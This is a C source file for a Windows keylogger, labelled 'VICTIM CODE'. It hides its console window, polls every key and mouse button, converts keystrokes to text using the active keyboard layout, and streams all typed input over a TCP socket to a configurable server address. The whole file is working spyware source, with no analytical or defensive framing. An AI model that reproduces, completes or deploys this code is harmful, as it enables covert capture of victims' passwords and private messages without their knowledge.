    //VICTIM CODE
    #include <stdio.h>
    #include <string.h>
    #include <conio.h>
    #include <winsock2.h>
    #include <windows.h>

    #define WSA_VERSION_CODE 0x202
    #define SERVER_ADDR "127.0.0.1"
    #define SERVER_PORT 8080
    #define CLICK_MARKER '\x01'

    //TRANSLATE A KEYSTROKE INTO THE UTF-8 TEXT THE USER IS ACTUALLY TYPING
    static int keyToUtf8(int vk, char *out, int outSize){
        BYTE keyState[256];
        WCHAR unicodeChar[8];
        int charCount;
        UINT scanCode;

        memset(keyState, 0, sizeof(keyState));

        //SHIFT AND CAPSLOCK DECIDE BETWEEN LOWERCASE AND UPPERCASE
        if(GetAsyncKeyState(VK_SHIFT) & 0x8000){
            keyState[VK_SHIFT] = keyState[VK_LSHIFT] = 0x80;
        }
        if(GetKeyState(VK_CAPITAL) & 1){
            keyState[VK_CAPITAL] = 0x01;
        }

        //CONTROL AND ALT ARE NEEDED FOR ALTGR (E.G. @ AND # ON A SPANISH KEYBOARD)
        if(GetAsyncKeyState(VK_CONTROL) & 0x8000){
            keyState[VK_CONTROL] = keyState[VK_LCONTROL] = 0x80;
        }
        if(GetAsyncKeyState(VK_MENU) & 0x8000){
            keyState[VK_MENU] = keyState[VK_LMENU] = 0x80;
        }
        if(GetAsyncKeyState(VK_RMENU) & 0x8000){
            keyState[VK_MENU] = keyState[VK_RMENU] = 0x80;
            keyState[VK_CONTROL] = keyState[VK_LCONTROL] = 0x80;
        }

        //CONVERT THE VIRTUAL KEY USING THE ACTIVE KEYBOARD LAYOUT
        scanCode = MapVirtualKey((UINT)vk, MAPVK_VK_TO_VSC);
        charCount = ToUnicode((UINT)vk, scanCode, keyState, unicodeChar, 8, 0);
        if(charCount <= 0){
            return 0;   //DEAD KEY, F1, ARROWS, SHIFT... NOTHING TO PRINT
        }

        return WideCharToMultiByte(CP_UTF8, 0, unicodeChar, charCount, out, outSize, NULL, NULL);
    }

    //SEND ONE KEYSTROKE (TEXT, ENTER, TAB OR BACKSPACE) TO THE SERVER
    static BOOL sendKey(SOCKET connectionSocket, int vk){
        char text[8];
        int length = 0;
        unsigned char firstByte;

        //MOUSE CLICKS TELL THE SERVER TO BREAK THE LINE (LIKE CHANGING FIELDS)
        if(vk == VK_LBUTTON || vk == VK_RBUTTON || vk == VK_MBUTTON ||
           vk == VK_XBUTTON1 || vk == VK_XBUTTON2){
            text[0] = CLICK_MARKER;
            return send(connectionSocket, text, 1, 0) != SOCKET_ERROR;
        }

        switch(vk){
            case VK_RETURN: text[0] = '\n'; length = 1; break;
            case VK_BACK:   text[0] = '\b'; length = 1; break;
            case VK_TAB:    text[0] = '\t'; length = 1; break;
            default:        length = keyToUtf8(vk, text, sizeof(text)); break;
        }

        if(length <= 0){
            return TRUE;    //THE KEY PRODUCES NO TEXT, KEEP LOGGING
        }

        //SKIP CONTROL CHARACTERS SUCH AS CTRL+A OR ESC
        firstByte = (unsigned char)text[0];
        if(length == 1 && firstByte < 0x20 &&
            text[0] != '\n' && text[0] != '\t' && text[0] != '\b'){
            return TRUE;
        }

        return send(connectionSocket, text, length, 0) != SOCKET_ERROR;
    }

    int main(void){
        WSADATA wsadata;
        SOCKET connectionSocket;
        SOCKADDR_IN serverAddr;

        //HIDE CONSOLE VIEW (COMMENT THIS LINE OUT WHILE DEBUGGING)
        FreeConsole();

        //ACTIVATE THE KEYBOARD LAYOUT SO ALTGR COMBINATIONS (@, #, ~...) ARE TRANSLATED
        char keyboardLayoutName[KL_NAMELENGTH];
        if(GetKeyboardLayoutNameA(keyboardLayoutName)){
            LoadKeyboardLayoutA(keyboardLayoutName, KLF_ACTIVATE);
        }

        //INITIALIZE WINDOWS SOCKET API
        if(WSAStartup(WSA_VERSION_CODE, &wsadata) != 0){
            WSACleanup();
            return -1;
        }

        //CREATE CLIENT SOCKET
        connectionSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(connectionSocket == INVALID_SOCKET){
            closesocket(connectionSocket);
            WSACleanup();
            return -1;
        }
        
        //INITIALIZE SOCKET SERVER ADDR TO CONNECT
        memset(&serverAddr, 0, sizeof(serverAddr));
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = inet_addr(SERVER_ADDR);
        serverAddr.sin_port = htons(SERVER_PORT);

        //CONNECT TO SERVER
        if(connect(connectionSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR){
            closesocket(connectionSocket);
            WSACleanup();
            return -1;    
        }
        
        int vk;
        BOOL keyWasDown[256] = {FALSE};
        BOOL keepRunning = TRUE;

        while(keepRunning){
            Sleep(10);
            for(vk = 0x01; vk <= 0xFE; vk++){    //0x01..0x06 ARE THE MOUSE BUTTONS
                if(GetAsyncKeyState(vk) & 0x8000){
                    if(!keyWasDown[vk]){
                        keyWasDown[vk] = TRUE;
                        if(!sendKey(connectionSocket, vk)){
                            keepRunning = FALSE;
                            break;
                        }
                    }
                }else{
                    keyWasDown[vk] = FALSE;
                }
            }
        }

        //SHUTDOWN AND CLOSE THE SOCKET AFTER THE PROGRAM TERMINATES
        shutdown(connectionSocket, SD_BOTH);
        closesocket(connectionSocket);
        WSACleanup();
        return 0;
    }
